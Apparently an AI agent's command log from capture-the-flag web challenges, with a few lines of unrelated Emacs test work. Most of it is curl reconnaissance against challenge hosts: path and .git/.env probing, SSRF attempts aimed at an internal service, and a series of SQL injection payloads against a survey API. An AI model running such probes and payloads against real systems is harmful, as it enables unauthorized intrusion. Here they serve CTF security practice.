[2026-07-01 07:38:25] unknown | execute_code_local | exit=1 cmd=cd /root/.emacs.d && grep -rl "output_sanitizer\|sanitize" test/ 2>/dev/null
[2026-07-01 07:39:23] unknown | execute_code_local | exit=0 cmd=cd /root/.emacs.d && ls test/test-sanitiz* test/test-output* 2>/dev/null; echo "---"; grep -rl "sanitize\|output_sanitizer" test/ 2>/dev/null || echo "no matches"
[2026-07-01 07:39:35] unknown | execute_code_local | exit=1 cmd=cd /root/.emacs.d && grep "^defun\|^defconst\|^defvar" init.d/output_sanitizer.el
[2026-07-01 07:39:41] unknown | execute_code_local | exit=0 cmd=cd /root/.emacs.d && grep -n "defun\|defconst\|defvar\|defcustom" init.d/output_sanitizer.el
[2026-07-01 07:40:48] darwin | write_file | /root/.emacs.d/test/test-sanitizer.el
[2026-07-04 16:27:34] ctfwizard | execute_code_local | exit=0 cmd=curl -s -X POST https://d4ce86fa14e84d71.chal.ctf.ae/api/intent/send -H "Content-Type: application/json" -d '{"component":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity","extras":{"next_inte...
[2026-07-04 16:27:36] ctfwizard | execute_code_local | exit=0 cmd=curl -s -X POST https://d4ce86fa14e84d71.chal.ctf.ae/api/intent/send -H "Content-Type: application/json" -d '{"component":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity","extras":{"next_inte...
[2026-07-04 16:27:37] ctfwizard | execute_code_local | exit=0 cmd=echo "=== Try POST /api/supplier/register with all fields + feed_url, then sync, then check products ==="\necho "--- Register with feed_url pointing to internal ---"\nRESP=$(curl -sS -X POST "https:/...
[2026-07-04 16:27:39] ctfwizard | execute_code_local | exit=0 cmd=curl -s -X POST https://d4ce86fa14e84d71.chal.ctf.ae/api/intent/send -H "Content-Type: application/json" -d '{"component":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity","extras":{"next_inte...
[2026-07-04 16:27:44] ctfwizard | execute_code_local | exit=0 cmd=curl -s https://d4ce86fa14e84d71.chal.ctf.ae/api/ 2>&1
[2026-07-04 16:27:46] ctfwizard | execute_code_local | exit=0 cmd=curl -s https://d4ce86fa14e84d71.chal.ctf.ae/ 2>&1
[2026-07-04 16:27:51] ctfwizard | execute_code_local | exit=0 cmd=curl -s https://d4ce86fa14e84d71.chal.ctf.ae/api/manifest 2>&1
[2026-07-04 16:27:52] ctfwizard | execute_code_local | exit=0 cmd=echo "=== Try registering with feed_url and then POST sync with supplier_id param ==="\necho "--- Register with feed_url ---"\nRESP=$(curl -sS -X POST "https://7157b3c478d188f3.chal.ctf.ae/api/suppli...
[2026-07-04 16:27:54] ctfwizard | execute_code_local | exit=0 cmd=curl -s https://d4ce86fa14e84d71.chal.ctf.ae/api/activities 2>&1
[2026-07-04 16:27:59] ctfwizard | execute_code_local | exit=0 cmd=curl -s https://d4ce86fa14e84d71.chal.ctf.ae/api/info 2>&1
[2026-07-04 16:28:01] ctfwizard | execute_code_local | exit=0 cmd=curl -s -X POST https://d4ce86fa14e84d71.chal.ctf.ae/api/intent/send -H "Content-Type: application/json" -d '{"component":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity","extras":{"next_inte...
[2026-07-04 16:28:13] unknown | write_file | /root/workspace/writeup_glass_houses.md
[2026-07-04 16:28:24] unknown | append_file | /root/.emacs.d/workspace/FLAGS.md
[2026-07-04 16:29:02] ctfwizard | execute_code_local | exit=0 cmd=curl -s -k https://7157b3c478d188f3.chal.ctf.ae/api/products/sync -X POST -H "Content-Type: application/json" -d '{"source":"http://internal:8080/api","supplier_id":"test"}' 2>&1
[2026-07-04 16:29:06] ctfwizard | execute_code_local | exit=0 cmd=curl -s -k https://7157b3c478d188f3.chal.ctf.ae/api/supplier/register -X POST -H "Content-Type: application/json" -d '{"company_name":"TestCo3","contact_email":"test3@test.com","website":"http://in...
[2026-07-04 16:29:12] ctfwizard | execute_code_local | exit=0 cmd=# Check what the registration actually stored - look at supplier products with the new IDs\ncurl -s -k https://7157b3c478d188f3.chal.ctf.ae/api/supplier/products -H "X-Supplier-ID: 2fac12fa" 2>&1\nec...
[2026-07-04 16:29:31] ctfwizard | execute_code_local | exit=0 cmd=# Try various endpoint names related to feeds, webhooks, callbacks, imports, verification\nfor ep in feed feeds import imports webhook webhooks callback callbacks sync/config sync-config config veri...
[2026-07-04 16:29:45] ctfwizard | execute_code_local | exit=0 cmd=# All 404. Let me try more endpoint patterns and also check with different methods\nfor ep in supplier/verify supplier/promote supplier/upgrade supplier/trust supplier/approve supplier/status suppli...
[2026-07-04 16:29:49] ctfwizard | execute_code_local | exit=0 cmd=# Let me look more carefully at the supplier registration - try different field names and see if any affect behavior\n# Also try to register with "status":"trusted" or "verified":true or "is_partner...
[2026-07-04 16:29:52] ctfwizard | execute_code_local | exit=0 cmd=# Let me check the products endpoint more carefully - look at the full product structure\ncurl -s -k https://7157b3c478d188f3.chal.ctf.ae/api/products | python3 -m json.tool 2>&1 | head -80
[2026-07-04 16:29:55] ctfwizard | execute_code_local | exit=0 cmd=# Let me check the docs more carefully and try submitting products with various URL fields\ncurl -s -k https://7157b3c478d188f3.chal.ctf.ae/api/docs | python3 -m json.tool 2>&1
[2026-07-04 16:30:10] ctfwizard | execute_code_local | exit=0 cmd=# Let me try submitting a product with various URL-containing fields and see if any trigger a fetch\n# First register a clean supplier\nSUP_ID=$(curl -s -k https://7157b3c478d188f3.chal.ctf.ae/api/su...
[2026-07-04 16:30:18] unknown | write_file | /root/workspace/phantom-thread.md
[2026-07-04 16:30:24] ctfwizard | execute_code_local | exit=0 cmd=# The product submission only stores name, price, status, supplier_id - other fields are ignored\n# Let me check if the products have any additional fields after sync\ncurl -s -k https://7157b3c478d1...
[2026-07-04 16:30:42] ctfwizard | execute_code_local | exit=0 cmd=# The sync just promotes pending products to catalog. No SSRF through product fields.\n# Let me focus on the supplier registration - maybe there's a field that sets a feed URL\n# Let me try many fiel...
[2026-07-04 16:30:51] ctfwizard | execute_code_local | exit=0 cmd=# All registrations are identical. The registration doesn't seem to accept feed URLs.\n# Let me re-examine the challenge. The partners endpoint had "api_endpoint" fields.\n# Maybe there's a partner r...
[2026-07-04 16:31:05] ctfwizard | execute_code_local | exit=0 cmd=# Let me check if /api/suppliers or /api/partners work with different methods or if they were removed\n# Also check if there's a supplier profile/info endpoint\nfor ep in api/suppliers api/suppliers/...
[2026-07-04 16:32:00] ctfwizard | execute_code_local | exit=0 cmd=echo "=== 9. GET on endpoint variations ==="\nfor ep in /api/supplier/feed /api/supplier/feeds /api/supplier/config /api/supplier/settings /api/supplier/profile /api/supplier/me /api/products/feeds ...
[2026-07-04 16:32:19] ctfwizard | execute_code_local | exit=0 cmd=curl -s -k -o /dev/null -w "%{http_code}" https://8e499c650a640718.chal.ctf.ae/.git/ 2>&1; echo " .git/"; curl -s -k -o /dev/null -w "%{http_code}" https://8e499c650a640718.chal.ctf.ae/.env 2>&1; e...
[2026-07-04 16:32:22] ctfwizard | execute_code_local | exit=0 cmd=curl -v -k -L https://8e499c650a640718.chal.ctf.ae/login 2>&1
[2026-07-04 16:32:27] ctfwizard | execute_code_local | exit=0 cmd=curl -v -k -L https://8e499c650a640718.chal.ctf.ae/register 2>&1
[2026-07-04 16:32:27] ctfwizard | execute_code_local | exit=0 cmd=echo "=== RE-RUN: HEAD requests (key ones) ==="\necho "--- HEAD / ---"\ncurl -sS -D - -o /dev/null -I https://7157b3c478d188f3.chal.ctf.ae/ 2>&1\necho "--- HEAD /api/products ---"\ncurl -sS -D - -o /de...
[2026-07-04 16:32:37] ctfwizard | execute_code_local | exit=0 cmd=echo "=== OPTIONS REQUESTS ==="\necho "--- OPTIONS /api/products ---"\ncurl -sS -D - -o /dev/null -X OPTIONS https://7157b3c478d188f3.chal.ctf.ae/api/products 2>&1\necho "--- OPTIONS /api/products/1 -...
[2026-07-04 16:32:40] ctfwizard | execute_code_local | exit=0 cmd=curl -v -k -L https://8e499c650a640718.chal.ctf.ae/ 2>&1 | head -30
[2026-07-04 16:32:43] ctfwizard | execute_code_local | exit=0 cmd=echo "=== 3. X-Supplier-ID variations ==="\necho "--- X-Supplier-ID: internal ---"\ncurl -sS -i https://7157b3c478d188f3.chal.ctf.ae/api/supplier/products -H "X-Supplier-ID: internal" 2>&1\necho "--- ...
[2026-07-04 16:32:45] ctfwizard | execute_code_local | exit=0 cmd=curl -s -k -o /dev/null -w "%{http_code} %{redirect_url}" https://8e499c650a640718.chal.ctf.ae/ 2>&1
[2026-07-04 16:32:52] ctfwizard | execute_code_local | exit=0 cmd=echo "=== 4. POST on feed-related endpoints ==="\necho "--- POST /api/supplier/feed ---"\ncurl -sS -i -X POST https://7157b3c478d188f3.chal.ctf.ae/api/supplier/feed -H "Content-Type: application/json...
[2026-07-04 16:33:03] ctfwizard | execute_code_local | exit=0 cmd=echo "=== 5. Search parameter tests ==="\necho "--- search=flag ---"\ncurl -sS -i "https://7157b3c478d188f3.chal.ctf.ae/api/products?search=flag" 2>&1\necho "--- search=secret ---"\ncurl -sS -i "https:...
[2026-07-04 16:33:09] ctfwizard | execute_code_local | exit=0 cmd=# Check more paths\nfor p in /dashboard /profile /logout /admin/ /api/ /api/v1/ /health /status /debug /config /settings /static/js/ /static/css/ /media/ /favicon.ico /index/ /home/ /portal/ /panel/...
[2026-07-04 16:33:10] ctfwizard | execute_code_local | exit=0 cmd=echo "=== 6. POST /api/supplier/products with URL as X-Supplier-ID ==="\ncurl -sS -i -X POST https://7157b3c478d188f3.chal.ctf.ae/api/supplier/products -H "Content-Type: application/json" -H "X-Supp...
[2026-07-04 16:33:16] ctfwizard | execute_code_local | exit=0 cmd=# Check /health/ and /dashboard/ with redirects\ncurl -s -k -o /dev/null -w "%{http_code} %{redirect_url}" https://8e499c650a640718.chal.ctf.ae/health 2>&1\necho ""\ncurl -s -k -o /dev/null -w "%{http...
[2026-07-04 16:33:23] ctfwizard | execute_code_local | exit=0 cmd=curl -s -k -L https://8e499c650a640718.chal.ctf.ae/health/ 2>&1
[2026-07-04 16:33:28] ctfwizard | execute_code_local | exit=0 cmd=# Check /dashboard/ - it probably redirects to login since we're not authenticated\ncurl -s -k -o /dev/null -w "%{http_code} %{redirect_url}" https://8e499c650a640718.chal.ctf.ae/dashboard/ 2>&1\nech...
[2026-07-04 16:33:31] ctfwizard | execute_code_local | exit=0 cmd=echo "=== GET /api/docs (full body) ==="\ncurl -sS https://7157b3c478d188f3.chal.ctf.ae/api/docs 2>&1\n\necho ""\necho "=== GET / (full body) ==="\ncurl -sS https://7157b3c478d188f3.chal.ctf.ae/ 2>&1\n\ne...
[2026-07-04 16:33:36] ctfwizard | execute_code_local | exit=0 cmd=echo "=== Register a new supplier to get a valid supplier_id ==="\ncurl -sS -i -X POST https://7157b3c478d188f3.chal.ctf.ae/api/supplier/register -H "Content-Type: application/json" -d '{"name":"rec...
[2026-07-04 16:33:36] ctfwizard | execute_code_local | exit=0 cmd=# Now let's try registering a user and see what happens. First, get a fresh CSRF token\nCSRF=$(curl -s -k -c - https://8e499c650a640718.chal.ctf.ae/register/ 2>&1 | grep csrftoken | awk '{print $NF}...
[2026-07-04 16:33:41] ctfwizard | execute_code_local | exit=0 cmd=echo "=== Register with correct fields ==="\ncurl -sS -i -X POST https://7157b3c478d188f3.chal.ctf.ae/api/supplier/register -H "Content-Type: application/json" -d '{"company_name":"ReconCorp","conta...
[2026-07-04 16:33:44] ctfwizard | execute_code_local | exit=0 cmd=# Let's try with -c and -b cookie jar approach\ncurl -s -k -c /tmp/cookies.txt https://8e499c650a640718.chal.ctf.ae/register/ -o /dev/null 2>&1\nCSRF=$(grep csrftoken /tmp/cookies.txt | awk '{print $...
[2026-07-04 16:33:56] ctfwizard | execute_code_local | exit=0 cmd=echo "=== Use new supplier_id to GET /api/supplier/products ==="\ncurl -sS -i https://7157b3c478d188f3.chal.ctf.ae/api/supplier/products -H "X-Supplier-ID: bbacf9a5" 2>&1\n\necho ""\necho "=== POST a p...
[2026-07-04 16:34:07] ctfwizard | execute_code_local | exit=0 cmd=echo "=== POST /api/products/sync with JSON body containing URL ==="\ncurl -sS -i -X POST https://7157b3c478d188f3.chal.ctf.ae/api/products/sync -H "Content-Type: application/json" -d '{"url":"http:...
[2026-07-04 16:34:18] ctfwizard | execute_code_local | exit=0 cmd=echo "=== Try POST /api/supplier/register with feed_url field ==="\ncurl -sS -i -X POST https://7157b3c478d188f3.chal.ctf.ae/api/supplier/register -H "Content-Type: application/json" -d '{"company_n...
[2026-07-04 16:34:27] ctfwizard | execute_code_local | exit=0 cmd=curl -s -k -c /tmp/cookies2.txt https://8e499c650a640718.chal.ctf.ae/register/ -o /dev/null && echo "Cookies saved:" && cat /tmp/cookies2.txt && CSRF=$(grep csrftoken /tmp/cookies2.txt | awk '{prin...
[2026-07-04 16:34:28] ctfwizard | execute_code_local | exit=0 cmd=echo "=== Try POST /api/supplier/products with various URL-containing fields ==="\nSID="bbacf9a5"\n\necho "--- with image field ---"\ncurl -sS -i -X POST https://7157b3c478d188f3.chal.ctf.ae/api/suppli...
[2026-07-04 16:34:37] ctfwizard | execute_code_local | exit=0 cmd=CSRF=$(grep csrftoken /tmp/cookies2.txt | awk '{print $NF}') && curl -v -k -b /tmp/cookies2.txt -c /tmp/cookies2.txt -X POST https://8e499c650a640718.chal.ctf.ae/register/ \\n  -H "Referer: https://...
[2026-07-04 16:34:41] ctfwizard | execute_code_local | exit=0 cmd=curl -s -k -b /tmp/cookies2.txt -L https://8e499c650a640718.chal.ctf.ae/dashboard/ 2>&1
[2026-07-04 16:34:47] ctfwizard | execute_code_local | exit=0 cmd=curl -s -k -b /tmp/cookies2.txt -L https://8e499c650a640718.chal.ctf.ae/admin/dashboard/ 2>&1
[2026-07-04 16:34:55] ctfwizard | execute_code_local | exit=2 cmd=for ep in /api /search /surveys /admin /login /flag /health /status /register /signup /survey /api/v1 /api/surveys /api/search; do echo "=== $ep ==="; curl -s -o /dev/null -w "%{http_code} %{redire...
[2026-07-04 16:35:07] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'for ep in /api /search /surveys /admin /login /flag /health /status /register /signup /survey /api/v1 /api/surveys /api/search; do echo "=== $ep ==="; curl -s -o /dev/null -w "%{http_code}...
[2026-07-04 16:35:09] ctfwizard | execute_code_local | exit=0 cmd=curl -s -D - https://1177227cbf30dfca.chal.ctf.ae/ 2>&1
[2026-07-04 16:35:12] ctfwizard | execute_code_local | exit=0 cmd=curl -s https://1177227cbf30dfca.chal.ctf.ae/robots.txt 2>&1
[2026-07-04 16:35:16] ctfwizard | execute_code_local | exit=0 cmd=curl -s https://1177227cbf30dfca.chal.ctf.ae/.git/HEAD 2>&1
[2026-07-04 16:35:22] ctfwizard | execute_code_local | exit=0 cmd=curl -s https://1177227cbf30dfca.chal.ctf.ae/api/surveys/ 2>&1
[2026-07-04 16:35:25] ctfwizard | execute_code_local | exit=0 cmd=curl -s -D - https://1177227cbf30dfca.chal.ctf.ae/api/surveys/ 2>&1 | head -20
[2026-07-04 16:35:28] ctfwizard | execute_code_local | exit=0 cmd=curl -s https://1177227cbf30dfca.chal.ctf.ae/health/ 2>&1
[2026-07-04 16:35:32] ctfwizard | execute_code_local | exit=0 cmd=curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=test" 2>&1
[2026-07-04 16:35:35] ctfwizard | execute_code_local | exit=0 cmd=curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?author__icontains=test" 2>&1
[2026-07-04 16:35:35] unknown | append_file | /root/.emacs.d/workspace/FLAGS.md
[2026-07-04 16:35:38] ctfwizard | execute_code_local | exit=0 cmd=curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?category=Technology" 2>&1
[2026-07-04 16:35:43] ctfwizard | execute_code_local | exit=0 cmd=curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?id=1" 2>&1
[2026-07-04 16:35:46] ctfwizard | execute_code_local | exit=0 cmd=curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?description__icontains=developer" 2>&1
[2026-07-04 16:35:49] ctfwizard | execute_code_local | exit=3 cmd=curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=developer' OR '1'='1" 2>&1
[2026-07-04 16:35:52] ctfwizard | execute_code_local | exit=0 cmd=curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=developer%27%20OR%20%271%27%3D%271" 2>&1
[2026-07-04 16:35:55] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=developer%27%20OR%20%271%27=%271"'
[2026-07-04 16:36:00] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%20OR%20%271%27=%271"'
[2026-07-04 16:36:03] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27)%20OR%20(%271%27=%271"'
[2026-07-04 16:36:06] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%20OR%20%271%27=%271%20--"'
[2026-07-04 16:36:10] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%20OR%201=1%20--%20"'
[2026-07-04 16:36:13] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%20OR%201=1%3B%20--%20"'
[2026-07-04 16:36:18] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%20OR%201=1%3B%20SELECT%20*%20FROM%20surveys%20--%20"'
[2026-07-04 16:36:20] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%20OR%201=1%3B%20--"'
[2026-07-04 16:36:24] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%3B%20SELECT%201%20--"'
[2026-07-04 16:36:27] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%3B--"'
[2026-07-04 16:36:30] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%22"'
[2026-07-04 16:36:33] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=a%27%20OR%20%271%27=%271%20--%20"'
[2026-07-04 16:36:35] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=Developer"'
[2026-07-04 16:36:38] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=Developer%27"'
[2026-07-04 16:36:41] ctfwizard | execute_code_local | exit=0 cmd=bash -c 'curl -s -D - "https://1177227cbf30dfca.chal.ctf.ae/api/surveys/?title__icontains=Developer%27" 2>&1 | head -20'
[2026-07-04 16:37:08] ctfwizard | execute_code_local | exit=0 cmd=echo "===== STEP 4a: Register with company_name as URL =====" && curl -sS -i -X POST https://7157b3c478d188f3.chal.ctf.ae/api/supplier/register -H "Content-Type: application/json" -d '{"company_nam...
[2026-07-04 16:37:10] ctfwizard | execute_code_local | exit=0 cmd=ls -la /root/workspace/public.zip 2>/dev/null
[2026-07-04 16:37:12] ctfwizard | execute_code_local | exit=81 cmd=cd /root/workspace && unzip -P infected -o public.zip -d public_extracted
[2026-07-04 16:37:12] ctfwizard | execute_code_local | exit=0 cmd=echo "===== STEP 4b: Sync after URL company_name registration =====" && curl -sS -i -X POST https://7157b3c478d188f3.chal.ctf.ae/api/products/sync -H "Content-Type: application/json" -d '{}' 2>&1 &...
[2026-07-04 16:37:14] ctfwizard | execute_code_local | exit=0 cmd=which 7z 2>/dev/null; which 7za 2>/dev/null; which p7zip 2>/dev/null; python3 -c "import zipfile; print('zipfile available')" 2>/dev/null
